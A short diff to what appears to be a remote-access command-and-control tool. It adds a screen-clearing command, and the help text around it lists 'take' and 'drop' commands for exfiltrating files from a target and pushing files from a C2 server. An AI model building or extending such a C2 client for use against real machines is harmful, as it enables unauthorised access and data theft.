@@ -173,6 +173,9 @@ rm <file> (linux)             :    To remove files
 
 del <file> (windows)          :    To remove files
 
+clear / cls (linux/windows)   :    To clear terminal/cmd
+(Can be used interchangeably)
+
 take <file> (linux/windows)   :    To exfiltrate file from trgt
 
 drop <file> (linux/windows)   :    To infiltrate file from C2 server to trgt
@@ -214,9 +217,11 @@ You can also use other commands related to networking, etc for linux as well as 
 
 
 		# clearing screen in windows ✓
-		elif cmd[:3] == "cls" and len(cmd) > 1:
+		elif (cmd[:3] == "cls" and len(cmd) > 1) or (cmd[:5] == 'clear' and len(cmd) > 1):
 
-			os.system("clear")
+			def screen_clear():
+				os.system('cls' if os.name=='nt' else 'clear')
+			screen_clear()
 
 		# Changing directory  ✓
 		elif cmd[:2] == "cd" and len(cmd) > 1:
